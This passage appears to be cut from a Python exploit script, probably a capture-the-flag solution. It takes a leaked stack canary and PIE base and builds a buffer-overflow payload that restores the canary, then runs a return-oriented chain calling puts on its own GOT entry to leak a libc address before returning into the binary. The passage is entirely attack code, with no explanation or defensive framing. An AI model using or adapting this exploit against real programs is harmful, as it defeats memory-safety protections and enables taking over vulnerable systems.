...
CANARY = b'\x00' + leak[:-6]
ELF_BASE = b'\x00' + leak[8:] + b'\x00\x00'

p = b'A' * 72
p += p64(u64(CANARY))
p += b'B' * 8
p += p64((u64(ELF_BASE) & ~0xfff) + pop_rdi)
p += p64((u64(ELF_BASE) & ~0xfff) + puts_got)
p += p64((u64(ELF_BASE) & ~0xfff) + puts_plt)
p += p64((u64(ELF_BASE) & ~0xfff) + 0x88a)
